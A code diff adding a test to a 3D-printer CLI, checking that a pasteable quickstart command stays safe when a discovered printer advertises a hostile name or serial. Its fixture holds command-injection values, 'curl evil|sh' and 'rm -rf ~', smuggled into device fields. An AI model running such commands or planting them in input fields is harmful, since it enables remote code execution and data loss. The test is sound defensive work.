@@ -188,3 +188,37 @@ class TestUpdatingASavedPrinter:
         # model of the same machine (test_cli_main's "Kept printer_model").
         assert result.exit_code == 0, result.output
         assert save.call_args.kwargs["printer_model"] is None
+
+
+class TestTheHandedOverCommand:
+    def test_a_hostile_name_from_the_network_cannot_run_in_a_shell(self):
+        # Quickstart hands over a command a person or an agent may paste into
+        # a shell, and the name, address and serial are what a device on the
+        # network advertised.
+        import shlex
+
+        from kiln.cli.discovery import DiscoveredPrinter
+        from kiln.cli.main import cli
+
+        found = DiscoveredPrinter(
+            host="10.0.0.7", port=5000, printer_type="octoprint", name="x;curl evil|sh",
+            serial="ABC123;rm -rf ~",
+        )
+        with (
+            mock.patch("kiln.cli.main._list_printers", return_value=[]),
+            mock.patch("kiln.cli.main.save_printer"),
+            mock.patch("kiln.cli.main.load_printer_config", side_effect=ValueError("not ready")),
+            mock.patch("kiln.cli.discovery.discover_printers", return_value=[found]),
+        ):
+            result = CliRunner().invoke(cli, ["quickstart", "--json"])
+        import json
+
+        finish = json.loads(result.output)["data"]["setup"]["finish_with"]
+        # Tokenised the way a shell reads it: an unquoted ; or | would come
+        # out as its own token and start a second command.
+        lexer = shlex.shlex(finish.replace("<model>", "MODEL"), posix=True, punctuation_chars=";|&")
+        words = list(lexer)
+        assert not {";", "|", "&", "&&", "||"} & set(words), words
+        assert words[:2] == ["kiln", "auth"]
+        assert words[words.index("--name") + 1] == "x;curl-evil|sh"
+        assert "--serial" not in words  # not a serial, so not handed over
